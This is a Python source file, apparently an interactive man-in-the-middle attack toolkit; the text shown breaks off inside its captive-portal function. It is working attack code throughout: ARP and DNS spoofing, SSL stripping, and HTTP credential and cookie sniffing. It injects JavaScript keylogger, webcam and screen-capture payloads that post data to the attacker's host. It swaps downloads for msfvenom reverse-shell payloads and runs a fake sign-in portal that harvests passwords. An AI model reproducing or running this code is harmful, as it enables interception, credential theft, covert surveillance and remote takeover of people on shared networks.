#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import ctypes
import threading
import json
import base64
import datetime

try:
    from netfilterqueue import NetfilterQueue
    HAS_NFQ = True
except ImportError:
    HAS_NFQ = False

from scapy.all import (
    ARP, getmacbyip, send, get_if_hwaddr,
    sniff, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap,
    conf, get_if_addr, sr, ICMP
)
from scapy.layers.l2 import arping
import socket
import http.server
import socketserver
import urllib.request
import signal
import shutil


# ── ANSI colours ──────────────────────────────────────────────────────────────
class C:
    RED    = '\033[91m'
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    BLUE   = '\033[94m'
    PURPLE = '\033[95m'
    CYAN   = '\033[96m'
    WHITE  = '\033[97m'
    BOLD   = '\033[1m'
    DIM    = '\033[2m'
    END    = '\033[0m'


# ── Thread-safe log buffer ────────────────────────────────────────────────────
_log_lock = threading.Lock()
_log_buf: list = []
MAX_LOG = 12

def log(msg: str, color: str = C.WHITE) -> None:
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    entry = f"{C.DIM}[{ts}]{C.END} {color}{msg}{C.END}"
    with _log_lock:
        _log_buf.append(entry)
        if len(_log_buf) > MAX_LOG:
            _log_buf.pop(0)


# ── Global state ──────────────────────────────────────────────────────────────
class State:
    # internal services
    arp_active         = False
    http_active        = False
    _http_srv          = None
    attacker_ip        = ""

    # attacks
    pcap_active        = False
    cred_active        = False
    dns_active         = False
    inject_active      = False   # shared for all JS injection attacks
    inject_type        = ""      # "keylogger" | "webcam" | "screen" | "image" | "custom"
    ssl_active         = False
    payload_active     = False
    filereplace_active = False   # custom file replace (no Metasploit required)
    http_log_active    = False
    captive_active     = False
    _captive_srv       = None
    _captive_owns_dns  = False   # true if captive portal started DNS (so it can stop it)

st = State()
LINUX = sys.platform.startswith("linux")


# ── Platform helpers ──────────────────────────────────────────────────────────
def is_admin() -> bool:
    if LINUX:
        return os.geteuid() == 0
    if sys.platform == "win32":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            pass
    return False

def clear_screen():
    subprocess.run("cls" if sys.platform == "win32" else "clear", shell=True, check=False)

def ask_file(prompt: str) -> str:
    """Read a file path from stdin, stripping quotes added by drag-and-drop."""
    raw = input(prompt).strip()
    return raw.strip('"').strip("'")

def _serve_file(local_path: str, as_name: str = "") -> str:
    """Copy `local_path` into CWD so the HTTP server can serve it. Returns filename."""
    fname = as_name or os.path.basename(local_path)
    dest  = os.path.join(os.getcwd(), fname)
    if os.path.abspath(local_path) != os.path.abspath(dest):
        shutil.copy2(local_path, dest)
    return fname

def _attack_header(title: str, tip: str = ""):
    W2 = 60
    print(f"\n{C.CYAN}{C.BOLD}  {'─' * W2}")
    print(f"  {title}")
    if tip:
        print(f"  {C.DIM}{tip}{C.END}")
    print(f"{C.CYAN}  {'─' * W2}{C.END}\n")


# ── Network helpers ───────────────────────────────────────────────────────────
def get_default_iface():
    try:
        return conf.iface
    except Exception:
        return None

def get_network_info(iface):
    try:
        ip = get_if_addr(iface)
        prefix = ".".join(ip.split(".")[:3])
        return ip, f"{prefix}.0/24"
    except Exception:
        return None, None

def get_gateway() -> str:
    try:
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        return ""

def scan_network(network: str) -> list:
    log(f"Scanning {network} ...", C.YELLOW)
    try:
        ans, _ = arping(network, timeout=2, verbose=0)
        devices = []
        for _, rcv in ans:
            try:
                hostname = socket.gethostbyaddr(rcv.psrc)[0]
            except Exception:
                hostname = "Unknown"
            devices.append({"ip": rcv.psrc, "mac": rcv.hwsrc, "hostname": hostname})
        return devices
    except Exception as e:
        log(f"Scan error: {e}", C.RED)
        return []

def guess_os(ip: str) -> str:
    try:
        ans, _ = sr(IP(dst=ip) / ICMP(), timeout=2, verbose=0)
        if ans:
            ttl = ans[0][1].ttl
            if ttl <= 64:  return "Linux / Android / macOS"
            if ttl <= 128: return "Windows"
            return "Network Device / Solaris"
    except Exception:
        pass
    return "Unknown"

def get_vendor(mac: str) -> str:
    try:
        req = urllib.request.Request(
            f"https://api.macvendors.com/{mac}",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        return urllib.request.urlopen(req, timeout=3).read().decode()
    except Exception:
        return "Unknown"

def ip_forward(enable: bool):
    flag = "1" if enable else "0"
    if LINUX:
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={flag}"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif sys.platform == "win32":
        action = "Enabled" if enable else "Disabled"
        subprocess.run(
            ["powershell", "-Command", f"Set-NetIPInterface -Forwarding {action}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

def restore_arp(target_ip: str, gw_ip: str, iface: str):
    try:
        my_mac = get_if_hwaddr(iface)
        tmac = getmacbyip(target_ip)
        gmac = getmacbyip(gw_ip)
        if tmac:
            send(ARP(op=2, pdst=target_ip, hwdst=tmac, psrc=gw_ip,   hwsrc=my_mac), count=5, verbose=0)
        if gmac:
            send(ARP(op=2, pdst=gw_ip,     hwdst=gmac, psrc=target_ip, hwsrc=my_mac), count=5, verbose=0)
    except Exception:
        pass


# ── Internal service: ARP spoofing ────────────────────────────────────────────
def _arp_loop(target_ip: str, gw_ip: str, iface: str):
    tmac = getmacbyip(target_ip)
    gmac = getmacbyip(gw_ip)
    if not tmac or not gmac:
        log("[ARP] Cannot resolve MACs — aborting", C.RED)
        st.arp_active = False
        return
    p1 = ARP(op=2, pdst=target_ip, hwdst=tmac, psrc=gw_ip)
    p2 = ARP(op=2, pdst=gw_ip,     hwdst=gmac, psrc=target_ip)
    sent = 0
    while st.arp_active:
        send(p1, iface=iface, verbose=0)
        send(p2, iface=iface, verbose=0)
        sent += 2
        if sent % 20 == 0:
            log(f"[ARP] {sent} packets sent", C.DIM)
        time.sleep(2)
    log("[ARP] Stopped", C.YELLOW)

def _start_arp(target_ip: str, gw_ip: str, iface: str):
    if not st.arp_active:
        st.arp_active = True
        threading.Thread(target=_arp_loop, args=(target_ip, gw_ip, iface), daemon=True).start()
        log("[ARP] Spoofing auto-started", C.GREEN)
        time.sleep(0.8)   # let first packets arrive

def _maybe_stop_arp():
    """Stop ARP only when no attack needs it anymore."""
    still_needed = any([
        st.cred_active, st.dns_active, st.inject_active,
        st.ssl_active, st.payload_active, st.filereplace_active,
        st.http_log_active, st.captive_active
    ])
    if not still_needed:
        st.arp_active = False
        log("[ARP] Spoofing stopped (no active attacks)", C.YELLOW)


# ── Internal service: HTTP server ─────────────────────────────────────────────
class _ReusableTCP(socketserver.TCPServer):
    allow_reuse_address = True

class _HTTPHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        log(f"[HTTP] {fmt % args}", C.DIM)

    def do_GET(self):
        dispatch = {
            "/payload.js":   self._webcam_js,
            "/screen.js":    self._screen_js,
            "/keylogger.js": self._keylogger_js,
            "/replace.jpg":  self._replace_img,
        }
        fn = dispatch.get(self.path)
        if fn:
            fn()
        else:
            super().do_GET()

    def _js(self, code: str):
        data = code.encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/javascript")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _webcam_js(self):
        ip = st.attacker_ip
        self._js(f"""(function(){{
  function push(d){{fetch('http://{ip}:8000/capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{image:d}})}}).catch(()=>{{}});}}
  if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){{
    navigator.mediaDevices.getUserMedia({{video:true}}).then(function(s){{
      var v=document.createElement('video');v.srcObject=s;v.play();
      v.addEventListener('loadeddata',function(){{
        var c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
        c.getContext('2d').drawImage(v,0,0);push(c.toDataURL('image/jpeg'));
        s.getTracks().forEach(function(t){{t.stop();}});
      }});
    }}).catch(function(e){{console.log(e);}});
  }}
}})();""")

    def _screen_js(self):
        ip = st.attacker_ip
        self._js(f"""(function(){{
  if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){{
    navigator.mediaDevices.getDisplayMedia({{video:true}}).then(function(s){{
      var v=document.createElement('video');v.srcObject=s;v.play();
      setInterval(function(){{fetch('http://{ip}:8000/screen_capture',{{method:'POST',body:'x'}}).catch(()=>{{}});}},5000);
    }}).catch(function(e){{console.error(e);}});
  }}
}})();""")

    def _keylogger_js(self):
        ip = st.attacker_ip
        self._js(f"""(function(){{
  var k="";
  document.addEventListener('keypress',function(e){{k+=e.key;}});
  setInterval(function(){{
    if(k.length>0){{fetch('http://{ip}:8000/keylog',{{method:'POST',headers:{{'Content-Type':'text/plain'}},body:k}}).catch(()=>{{}});k="";}}
  }},3000);
}})();""")

    def _replace_img(self):
        try:
            with open("replace.jpg", "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except FileNotFoundError:
            self.send_error(404, "replace.jpg not found")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

        if self.path == "/capture":
            try:
                data = json.loads(body)
                if "image" in data:
                    _, enc = data["image"].split(",", 1)
                    fname = f"webcam_{int(time.time())}.jpg"
                    with open(fname, "wb") as f:
                        f.write(base64.b64decode(enc))
                    log(f"[WEBCAM] Saved → {fname}", C.GREEN)
            except Exception as e:
                log(f"[WEBCAM] Save error: {e}", C.RED)

        elif self.path == "/screen_capture":
            log("[SCREEN] Frame signal received from target", C.GREEN)

        elif self.path == "/keylog":
            text = body.decode("utf-8", errors="ignore")
            log(f"[KEYLOG] {repr(text)}", C.PURPLE)
            with open("keylog.txt", "a", encoding="utf-8") as f:
                f.write(text)

def _start_http(my_ip: str, port: int = 8000):
    if not st.http_active:
        st.attacker_ip = my_ip
        try:
            srv = _ReusableTCP((my_ip, port), _HTTPHandler)
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            st._http_srv = srv
            st.http_active = True
            log(f"[HTTP] Server started on {my_ip}:{port}", C.GREEN)
        except OSError as e:
            log(f"[HTTP] Cannot start server: {e}", C.RED)

def _maybe_stop_http():
    still_needed = any([st.inject_active, st.payload_active])
    if not still_needed and st.http_active and st._http_srv:
        st._http_srv.shutdown()
        st._http_srv.server_close()
        st._http_srv = None
        st.http_active = False
        log("[HTTP] Server stopped", C.YELLOW)


# ── JS injection engine ───────────────────────────────────────────────────────
# On Linux with NetfilterQueue: true packet interception via NFQUEUE queue 1.
# On Windows (passive fallback): sniff+send — may result in duplicate responses
# since the kernel already forwarded the original; best-effort only.

def _inject_loop_nfq(payload_bytes: bytes, active_fn):
    """Linux: real NFQUEUE interception on queue 1."""
    def process(pkt):
        sp = IP(pkt.get_payload())
        if sp.haslayer(Raw) and sp.haslayer(TCP) and sp[TCP].sport == 80:
            try:
                raw = sp[Raw].load
                if b"</body>" in raw:
                    sp[Raw].load = raw.replace(b"</body>", payload_bytes + b"</body>")
                    del sp[IP].len; del sp[IP].chksum; del sp[TCP].chksum
                    pkt.set_payload(bytes(sp))
                    log(f"[INJECT] Injected into response for {sp[IP].dst}", C.BLUE)
            except Exception:
                pass
        pkt.accept()
    q = NetfilterQueue()
    q.bind(1, process)
    try:
        q.run(stop_filter=lambda: not active_fn())
    finally:
        q.unbind()
    log("[INJECT] NFQ injector stopped", C.YELLOW)

def _inject_loop_passive(iface: str, payload: str, active_fn):
    """Windows passive fallback — sniff and re-send modified packet."""
    def process(pkt):
        if not active_fn():
            return
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[TCP].sport == 80:
            try:
                raw = pkt[Raw].load.decode("utf-8", errors="ignore")
                if "</body>" in raw and "text/html" in raw:
                    modified = raw.replace("</body>", payload + "</body>")
                    new = (IP(src=pkt[IP].src, dst=pkt[IP].dst) /
                           TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                               seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                               flags=pkt[TCP].flags) /
                           modified.encode("utf-8"))
                    del new[IP].len; del new[IP].chksum; del new[TCP].chksum
                    send(new, iface=iface, verbose=0)
                    log(f"[INJECT] Payload sent to {pkt[IP].dst}", C.BLUE)
                    return
            except Exception:
                pass
        send(pkt, iface=iface, verbose=0)
    sniff(iface=iface, filter="tcp port 80", prn=process,
          store=0, stop_filter=lambda _: not active_fn())
    log("[INJECT] Passive injector stopped", C.YELLOW)

def _start_inject(iface: str, my_ip: str, target_ip: str, gw_ip: str,
                  inject_type: str, payload: str):
    _start_arp(target_ip, gw_ip, iface)
    _start_http(my_ip)
    st.inject_active = True
    st.inject_type = inject_type
    active_fn = lambda: st.inject_active and st.inject_type == inject_type

    if LINUX and HAS_NFQ:
        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
        threading.Thread(
            target=_inject_loop_nfq,
            args=(payload.encode("utf-8"), active_fn),
            daemon=True
        ).start()
        log(f"[{inject_type.upper()}] Injection active (NFQUEUE — true intercept)", C.GREEN)
    else:
        threading.Thread(
            target=_inject_loop_passive,
            args=(iface, payload, active_fn),
            daemon=True
        ).start()
        log(f"[{inject_type.upper()}] Injection active (passive — Windows best-effort)", C.YELLOW)

def _stop_inject():
    st.inject_active = False
    st.inject_type = ""
    if LINUX and HAS_NFQ:
        subprocess.run(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"],
                       stderr=subprocess.DEVNULL)
    _maybe_stop_arp()
    _maybe_stop_http()


# ── Attack: Packet Capture ────────────────────────────────────────────────────
def toggle_pcap(iface: str):
    if st.pcap_active:
        st.pcap_active = False
    else:
        fname = f"capture_{int(time.time())}.pcap"
        st.pcap_active = True
        def _run():
            log(f"[PCAP] Capturing → {fname}", C.GREEN)
            sniff(iface=iface, store=False,
                  prn=lambda p: wrpcap(fname, p, append=True),
                  stop_filter=lambda _: not st.pcap_active)
            log(f"[PCAP] Stopped — saved to {fname}", C.YELLOW)
        threading.Thread(target=_run, daemon=True).start()


# ── Attack: Credential Sniffer ────────────────────────────────────────────────
def toggle_cred(iface: str, target_ip: str, gw_ip: str):
    if st.cred_active:
        st.cred_active = False
        _maybe_stop_arp()
    else:
        _start_arp(target_ip, gw_ip, iface)
        st.cred_active = True
        kw = ["username", "user", "login", "password", "pass", "email", "passwd", "pwd"]
        def _run():
            def process(pkt):
                if not st.cred_active: return
                if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80:
                    try:
                        load = pkt[Raw].load.decode("utf-8", errors="ignore")
                        if "POST" in load and any(k in load.lower() for k in kw):
                            log(f"[CRED] Hit from {pkt[IP].src} — check credentials.log", C.GREEN)
                            with open("credentials.log", "a", encoding="utf-8") as f:
                                f.write(f"--- {pkt[IP].src} @ {time.ctime()} ---\n")
                                for line in load.split("\n"):
                                    if any(k in line.lower() for k in kw):
                                        log(f"[CRED]   {line.strip()}", C.GREEN)
                                        f.write(line.strip() + "\n")
                                f.write("\n")
                    except Exception:
                        pass
            log("[CRED] Credential sniffer active (HTTP POST)", C.GREEN)
            sniff(iface=iface, filter="tcp port 80", prn=process,
                  store=0, stop_filter=lambda _: not st.cred_active)
            log("[CRED] Sniffer stopped", C.YELLOW)
        threading.Thread(target=_run, daemon=True).start()


# ── Attack: DNS Spoofing ──────────────────────────────────────────────────────
def toggle_dns(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    if st.dns_active:
        st.dns_active = False
        _maybe_stop_arp()
    else:
        _start_arp(target_ip, gw_ip, iface)
        st.dns_active = True
        def _run():
            def respond(pkt):
                if st.dns_active and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                    name = pkt[DNSQR].qname.decode()
                    spoofed = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                   an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=my_ip)))
                    send(spoofed, iface=iface, verbose=0)
                    log(f"[DNS] Spoofed {name.rstrip('.')} → {my_ip}", C.CYAN)
            log("[DNS] Spoofing active", C.GREEN)
            sniff(filter="udp port 53", prn=respond, store=0, iface=iface,
                  stop_filter=lambda _: not st.dns_active)
            log("[DNS] Stopped", C.YELLOW)
        threading.Thread(target=_run, daemon=True).start()


# ── Attack: JS Keylogger ──────────────────────────────────────────────────────
def toggle_keylogger(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    if st.inject_type == "keylogger":
        _stop_inject()
    elif st.inject_active:
        log(f"[KEYLOG] Stop '{st.inject_type}' injection first", C.RED)
    else:
        payload = f'<script src="http://{my_ip}:8000/keylogger.js"></script>'
        _start_inject(iface, my_ip, target_ip, gw_ip, "keylogger", payload)


# ── Attack: Webcam Capture ────────────────────────────────────────────────────
def toggle_webcam(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    if st.inject_type == "webcam":
        _stop_inject()
    elif st.inject_active:
        log(f"[WEBCAM] Stop '{st.inject_type}' injection first", C.RED)
    else:
        payload = f'<script src="http://{my_ip}:8000/payload.js"></script>'
        _start_inject(iface, my_ip, target_ip, gw_ip, "webcam", payload)


# ── Attack: Screen Capture ────────────────────────────────────────────────────
def toggle_screen(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    if st.inject_type == "screen":
        _stop_inject()
    elif st.inject_active:
        log(f"[SCREEN] Stop '{st.inject_type}' injection first", C.RED)
    else:
        payload = f'<script src="http://{my_ip}:8000/screen.js"></script>'
        _start_inject(iface, my_ip, target_ip, gw_ip, "screen", payload)


# ── Attack: Image Replace ─────────────────────────────────────────────────────
def toggle_image_replace(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    if st.inject_type == "image":
        _stop_inject()
    elif st.inject_active:
        log(f"[IMG] Stop '{st.inject_type}' injection first", C.RED)
    elif not os.path.exists("replace.jpg"):
        log("[IMG] replace.jpg not found in current directory", C.RED)
    else:
        js = (f"window.onload=function(){{"
              f"var i=document.getElementsByTagName('img');"
              f"for(var x=0;x<i.length;x++){{i[x].src='http://{my_ip}:8000/replace.jpg';}}"
              f"}};")
        payload = f"<script>{js}</script>"
        _start_inject(iface, my_ip, target_ip, gw_ip, "image", payload)


# ── Attack: Custom JS/HTML (needs user input — handled in main loop) ───────────
def toggle_custom_js(iface: str, my_ip: str, target_ip: str, gw_ip: str,
                     code: str = ""):
    if st.inject_type == "custom":
        _stop_inject()
    elif st.inject_active:
        log(f"[INJECT] Stop '{st.inject_type}' injection first", C.RED)
    elif code:
        _start_inject(iface, my_ip, target_ip, gw_ip, "custom", code)


# ── Attack: SSL Stripping (Linux only) ───────────────────────────────────────
def toggle_ssl(iface: str, target_ip: str, gw_ip: str):
    if not LINUX:
        log("[SSL] Linux only", C.RED); return
    if not HAS_NFQ:
        log("[SSL] NetfilterQueue not installed", C.RED); return
    if st.payload_active or st.filereplace_active:
        log("[SSL] Cannot run while Metasploit/File Replace is active (same NFQUEUE)", C.RED); return

    if st.ssl_active:
        st.ssl_active = False
        subprocess.run(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"],
                       stderr=subprocess.DEVNULL)
        _maybe_stop_arp()
    else:
        _start_arp(target_ip, gw_ip, iface)
        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
        st.ssl_active = True
        def _run():
            def process(pkt):
                sp = IP(pkt.get_payload())
                if sp.haslayer(Raw) and sp.haslayer(TCP) and sp[TCP].sport == 80:
                    try:
                        pl = sp[Raw].load
                        if b"Content-Type: text/html" in pl:
                            sp[Raw].load = pl.replace(b"https://", b"http://")
                            del sp[IP].len; del sp[IP].chksum; del sp[TCP].chksum
                            pkt.set_payload(bytes(sp))
                            log(f"[SSL] HTTPS→HTTP for {sp[IP].dst}", C.CYAN)
                    except Exception:
                        pass
                pkt.accept()
            log("[SSL] Stripping active", C.GREEN)
            q = NetfilterQueue()
            q.bind(0, process)
            try:
                q.run(stop_filter=lambda: not st.ssl_active)
            finally:
                q.unbind()
            log("[SSL] Stopped", C.YELLOW)
        threading.Thread(target=_run, daemon=True).start()


# ── Attack: Metasploit Payload Delivery (Linux only) ─────────────────────────
def start_payload(iface: str, my_ip: str, target_ip: str, gw_ip: str,
                  msf_payload: str, msf_fmt: str, pname: str, pext: bytes):
    if not LINUX:
        log("[PAYLOAD] Linux only", C.RED); return
    if not HAS_NFQ:
        log("[PAYLOAD] NetfilterQueue not installed", C.RED); return
    if st.ssl_active or st.filereplace_active:
        log("[PAYLOAD] Cannot run while SSL Strip / File Replace is active (same NFQUEUE)", C.RED); return

    _start_arp(target_ip, gw_ip, iface)
    _start_http(my_ip)

    print(f"\n{C.YELLOW}  [*] Generating payload with msfvenom ...{C.END}")
    try:
        subprocess.run(
            ["msfvenom", "-p", msf_payload,
             f"LHOST={my_ip}", "LPORT=4444", "-f", msf_fmt, "-o", pname],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        log(f"[PAYLOAD] {pname} generated", C.GREEN)
    except Exception as e:
        log(f"[PAYLOAD] msfvenom error: {e}", C.RED)
        return

    rc = "listener.rc"
    with open(rc, "w") as f:
        f.write(f"use exploit/multi/handler\nset payload {msf_payload}\n"
                f"set LHOST {my_ip}\nset LPORT 4444\nrun\n")

    launched = False
    for term in ["x-terminal-emulator", "qterminal", "xfce4-terminal", "gnome-terminal", "xterm"]:
        if subprocess.run(["which", term], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
            args = [term, "--", "msfconsole", "-q", "-r", rc] if term in \
                   ["gnome-terminal", "xfce4-terminal", "qterminal"] else \
                   [term, "-e", f"msfconsole -q -r {rc}"]
            subprocess.Popen(args)
            launched = True
            break
    if not launched:
        log(f"[PAYLOAD] No terminal found — run: msfconsole -q -r {rc}", C.YELLOW)
    else:
        log("[PAYLOAD] Metasploit listener launched in new terminal", C.GREEN)

    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    st.payload_active = True

    def _run():
        acks = []
        def process(pkt):
            sp = IP(pkt.get_payload())
            if sp.haslayer(Raw) and sp.haslayer(TCP):
                if sp[TCP].dport == 80 and pext in sp[Raw].load:
                    log(f"[PAYLOAD] {pext.decode()} download detected!", C.GREEN)
                    acks.append(sp[TCP].ack)
                elif sp[TCP].sport == 80 and sp[TCP].seq in acks:
                    acks.remove(sp[TCP].seq)
                    redir = (f"HTTP/1.1 301 Moved Permanently\n"
                             f"Location: http://{my_ip}:8000/{pname}\n\n")
                    sp[Raw].load = redir.encode()
                    del sp[IP].len; del sp[IP].chksum; del sp[TCP].chksum
                    pkt.set_payload(bytes(sp))
                    log("[PAYLOAD] Download replaced with payload!", C.GREEN)
            pkt.accept()
        log("[PAYLOAD] Download interceptor active", C.GREEN)
        q = NetfilterQueue()
        q.bind(0, process)
        try:
            q.run(stop_filter=lambda: not st.payload_active)
        finally:
            q.unbind()
        log("[PAYLOAD] Interceptor stopped", C.YELLOW)
    threading.Thread(target=_run, daemon=True).start()

def stop_payload():
    st.payload_active = False
    subprocess.run(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"],
                   stderr=subprocess.DEVNULL)
    _maybe_stop_arp()
    _maybe_stop_http()


# ── Attack: HTTP Traffic Logger ──────────────────────────────────────────────
def toggle_http_log(iface: str, target_ip: str, gw_ip: str):
    if st.http_log_active:
        st.http_log_active = False
        _maybe_stop_arp()
    else:
        _start_arp(target_ip, gw_ip, iface)
        st.http_log_active = True
        def _run():
            def process(pkt):
                if not st.http_log_active:
                    return
                if not (pkt.haslayer(Raw) and pkt.haslayer(TCP)):
                    return
                try:
                    load = pkt[Raw].load.decode("utf-8", errors="ignore")
                    lines = load.split("\r\n")
                    first = lines[0] if lines else ""
                    if not any(first.startswith(m) for m in ("GET ", "POST ", "PUT ", "HEAD ", "DELETE ")):
                        return
                    method = first.split(" ")[0]
                    path   = first.split(" ")[1] if " " in first else "/"
                    host   = next((l.split(": ", 1)[1] for l in lines
                                   if l.lower().startswith("host:")), pkt[IP].dst)
                    url    = f"http://{host}{path}"
                    log(f"[HTTPLOG] {method} {url}", C.CYAN)

                    with open("http_log.txt", "a", encoding="utf-8") as f:
                        f.write(f"[{time.ctime()}] {pkt[IP].src} {method} {url}\n")
                        for line in lines[1:]:
                            if not line.strip():
                                break
                            lkey = line.split(":", 1)[0].lower()
                            if lkey in ("cookie", "authorization", "referer", "user-agent"):
                                f.write(f"  {line}\n")
                                if lkey == "cookie":
                                    log(f"[COOKIE]  {line[:100]}", C.PURPLE)

                    if method == "POST":
                        body_start = load.find("\r\n\r\n")
                        if body_start != -1:
                            body = load[body_start + 4:].strip()
                            if body:
                                log(f"[POST]    {body[:120]}", C.YELLOW)
                                with open("http_log.txt", "a", encoding="utf-8") as f:
                                    f.write(f"  POST body: {body}\n")
                except Exception:
                    pass

            log("[HTTPLOG] HTTP traffic logger active → http_log.txt", C.GREEN)
            sniff(iface=iface, filter="tcp port 80", prn=process,
                  store=0, stop_filter=lambda _: not st.http_log_active)
            log("[HTTPLOG] Stopped", C.YELLOW)
        threading.Thread(target=_run, daemon=True).start()


# ── Attack: Captive Portal ────────────────────────────────────────────────────
_PORTAL_HTML = b"""<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Sign-In</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;
     justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;padding:2em 2.5em;border-radius:10px;
      box-shadow:0 4px 20px rgba(0,0,0,.15);width:320px}
h2{text-align:center;color:#1a1a2e;margin-bottom:.4em;font-size:1.4em}
p{text-align:center;color:#666;font-size:.85em;margin-bottom:1.5em}
input{width:100%;padding:.75em;margin-bottom:1em;border:1px solid #ddd;
      border-radius:6px;font-size:1em;outline:none}
input:focus{border-color:#1877f2}
button{width:100%;padding:.85em;background:#1877f2;color:#fff;border:none;
       border-radius:6px;font-size:1em;cursor:pointer;font-weight:bold}
button:hover{background:#1565d8}
.logo{text-align:center;font-size:2em;margin-bottom:.5em}
</style>
</head><body>
<div class="card">
  <div class="logo">&#127760;</div>
  <h2>Network Sign-In</h2>
  <p>Enter your credentials to access the network.</p>
  <form method="POST" action="/login">
    <input name="username" type="text" placeholder="Username or Email" required autocomplete="username">
    <input name="password" type="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit">Connect to Network</button>
  </form>
</div>
</body></html>"""

_PORTAL_SUCCESS = b"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Connected</title></head>
<body style="font-family:Arial;text-align:center;padding-top:6em;background:#f0f2f5">
<div style="background:#fff;display:inline-block;padding:2em 3em;border-radius:10px;
            box-shadow:0 4px 20px rgba(0,0,0,.1)">
<div style="font-size:3em;color:#28a745">&#10003;</div>
<h2 style="color:#1a1a2e;margin:.5em 0">Successfully Connected</h2>
<p style="color:#666">You may now browse the internet.</p>
</div></body></html>"""

class _CaptiveHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        log(f"[PORTAL] {fmt % args}", C.DIM)

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(_PORTAL_HTML)))
        self.end_headers()
        self.wfile.write(_PORTAL_HTML)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="ignore")
        from urllib.parse import parse_qs
        params = parse_qs(body)
        user = params.get("username", [""])[0]
        pwd  = params.get("password",  [""])[0]
        src  = self.client_address[0]
        log(f"[PORTAL] {C.BOLD}CREDENTIALS CAPTURED{C.END}{C.GREEN} from {src}: "
            f"user={user!r} pass={pwd!r}", C.GREEN)
        with open("portal_creds.log", "a", encoding="utf-8") as f:
            f.write(f"[{time.ctime()}] {src}  user={user!r}  pass={pwd!r}\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(_PORTAL_SUCCESS)))
        self.end_headers()
        self.wfile.write(_PORTAL_SUCCESS)

def toggle_captive(iface: str, my_ip: str, target_ip: str, gw_ip: str):
    if st.captive_active:
        # stop portal
        st.captive_active = False
        if st._captive_srv:
            try:
                st._captive_srv.shutdown()
                st._captive_srv.server_close()
            except Exception:
                pass
            st._captive_srv = None
        # stop DNS only if WE started it
        if st._captive_owns_dns:
            st.dns_active = False
            st._captive_owns_dns = False
        _maybe_stop_arp()
        log("[PORTAL] Captive portal stopped", C.YELLOW)
    else:
        _start_arp(target_ip, gw_ip, iface)
        # start portal HTTP server on port 80
        try:
            srv = _ReusableTCP(("", 80), _CaptiveHandler)
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            st._captive_srv = srv
        except OSError as e:
            log(f"[PORTAL] Cannot bind port 80: {e}  (try running as root/admin)", C.RED)
            _maybe_stop_arp()
            return
        # auto-start DNS spoofing if not already active
        if not st.dns_active:
            st.dns_active = True
            st._captive_owns_dns = True
            def _dns_run():
                def respond(pkt):
                    if st.dns_active and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                        name = pkt[DNSQR].qname.decode()
                        spoofed = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
